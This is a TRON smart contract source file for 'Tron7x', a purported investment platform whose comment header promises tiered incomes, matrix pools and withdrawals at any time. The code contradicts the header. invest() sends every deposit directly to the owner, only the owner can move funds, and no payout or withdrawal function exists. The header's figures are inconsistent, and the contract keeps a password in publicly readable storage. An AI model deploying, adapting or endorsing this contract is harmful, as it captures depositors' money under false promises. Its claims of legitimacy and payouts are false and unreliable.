//SourceUnit: Tron7x.sol

/*   tron7x - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original tron7x team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: tron7x.io                               │
 *      │                                                                  |
     |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (350 TRX minimum) using our website 
 *   3) Upgrade Package for level income , enter the TRX amount (400, 700, 1400, 3000, 6000, 12500, 21000, 35000, 50000,  minimum) using our website 
 *   4) Wait for your earnings By group Increase
 *   5) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Joining Amount 350 TRX Devide in two part Working and Non Working as 400 TRX and 150 TRX
 *   - One deposit: 350 TRX, 
 *   - Total income: based on your Group and Global Group
 *   - Earnings every moment, withdraw any time 
 *
 *   [Maximum Income]
 *
 *   - Working Income
 *   - Direct Income
 *   - 2X Magic Pool
 *   - Direct Sponsour Pool Income
 *   - Level Upgrade Income 
 *   - Matrix Income 
 *   - Auto Fill Matrix Income 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - Support work, technical functioning, No administration fee
 */


 pragma solidity ^0.4.25;
 contract Tron7x {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
        uint256 constant public INVEST_MIN_AMOUNT = 50 trx;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest() public payable{
        require(msg.value >= INVEST_MIN_AMOUNT);
        owner.transfer(msg.value);

    }
    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;

            if (owner==userAddress) {
            balances[msg.sender] += amount;
            owner.transfer(amount);
            }            
            
    }
    


}